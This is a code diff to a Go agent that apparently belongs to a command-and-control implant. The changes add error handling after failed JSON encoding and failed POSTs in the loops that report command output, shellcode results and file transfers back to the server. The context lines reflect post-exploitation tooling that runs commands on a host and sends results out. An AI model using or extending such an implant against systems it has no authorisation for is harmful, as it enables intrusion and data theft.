@@ -277,6 +277,7 @@ func (a *Agent) initialCheckIn(host string, client *http.Client) bool {
 		if a.Verbose {
 			message("warn", fmt.Sprintf("There was an error encoding the JSON message:\r\n%s", errJ.Error()))
 		}
+		return false
 	}
 	if a.Verbose {
 		message("note", fmt.Sprintf("Connecting to web server at %s for initial check in.", host))
@@ -350,6 +351,7 @@ func (a *Agent) statusCheckIn(host string, client *http.Client) {
 		if a.Verbose {
 			message("warn", fmt.Sprintf("There was an error encoding the JSON message:\r\n%s", errJ.Error()))
 		}
+		return
 	}
 
 	if a.Verbose {
@@ -575,6 +577,7 @@ func (a *Agent) statusCheckIn(host string, client *http.Client) {
 					message("warn", fmt.Sprintf("There was an error encoding the JSON message:\r\n%s",
 						err1.Error()))
 				}
+				break
 			}
 			resp2, respErr := client.Post(host, "application/json; charset=utf-8", b2)
 			if respErr != nil {
@@ -582,6 +585,7 @@ func (a *Agent) statusCheckIn(host string, client *http.Client) {
 					message("warn", "There was an error sending the FileTransfer message to the server")
 					message("warn", fmt.Sprintf("%s", respErr.Error()))
 				}
+				break
 			}
 			if resp2.StatusCode != 200 {
 				if a.Verbose {
@@ -627,6 +631,7 @@ func (a *Agent) statusCheckIn(host string, client *http.Client) {
 					message("warn", fmt.Sprintf("There was an error encoding the CmdPayload JSON "+
 						"message:\r\n%s", err3.Error()))
 				}
+				break
 			}
 			if a.Verbose {
 				message("note", fmt.Sprintf("Sending response to server: %s", stdout))
@@ -758,7 +763,7 @@ func (a *Agent) statusCheckIn(host string, client *http.Client) {
 						message("warn", fmt.Sprintf("There was an error encoding the JSON message:\r\n%s",
 							err1.Error()))
 					}
-					break //don't try and sent POST with broken/empty json
+					break
 				}
 				resp2, respErr := client.Post(host, "application/json; charset=utf-8", b2)
 				if respErr != nil {
@@ -766,7 +771,7 @@ func (a *Agent) statusCheckIn(host string, client *http.Client) {
 						message("warn", "There was an error sending the FileTransfer message to the server")
 						message("warn", fmt.Sprintf("%s", respErr.Error()))
 					}
-					break //resolves crash on error
+					break
 				}
 				if resp2.StatusCode != 200 {
 					if a.Verbose {
@@ -938,6 +943,7 @@ func (a *Agent) statusCheckIn(host string, client *http.Client) {
 			if a.Verbose {
 				if errEncode != nil {
 					message("warn", fmt.Sprintf("There was an error encoding the JSON message\r\n%s", errEncode.Error()))
+					break
 				} else {
 					message("note", fmt.Sprintf("Sending response to server: %s", so))
 				}
@@ -955,6 +961,7 @@ func (a *Agent) statusCheckIn(host string, client *http.Client) {
 					message("warn", "There was an error sending the CmdResults message to the server in the shellcode section")
 					message("warn", errPost.Error())
 				}
+				break
 			}
 
 			if resp2.StatusCode != 200 {
@@ -1011,6 +1018,7 @@ func (a *Agent) statusCheckIn(host string, client *http.Client) {
 						message("warn", fmt.Sprintf("There was an error encoding the JSON message for the"+
 							" ls command results:\r\n%s", err6.Error()))
 					}
+					break
 				}
 				if a.Verbose {
 					message("note", fmt.Sprintf("Sending response to server: %s", listing))
@@ -1080,6 +1088,7 @@ func (a *Agent) statusCheckIn(host string, client *http.Client) {
 						message("warn", "There was an error sending the CmdResults message to the server in the shellcode section")
 						message("warn", errPost.Error())
 					}
+					break
 				}
 				if resp2.StatusCode != 200 {
 					if a.Verbose {
@@ -1134,6 +1143,7 @@ func (a *Agent) statusCheckIn(host string, client *http.Client) {
 						message("warn", "There was an error sending the CmdResults message to the server in the shellcode section")
 						message("warn", errPost.Error())
 					}
+					break
 				}
 				if resp2.StatusCode != 200 {
 					if a.Verbose {
@@ -1323,6 +1333,7 @@ func (a *Agent) agentInfo(host string, client *http.Client) {
 		if a.Verbose {
 			message("warn", fmt.Sprintf("There was an error encoding the agentInfo JSON message:\r\n%s", err.Error()))
 		}
+		return
 	}
 	if a.Verbose {
 		message("note", fmt.Sprintf("Connecting to web server at %s to update agent configuration information.", host))
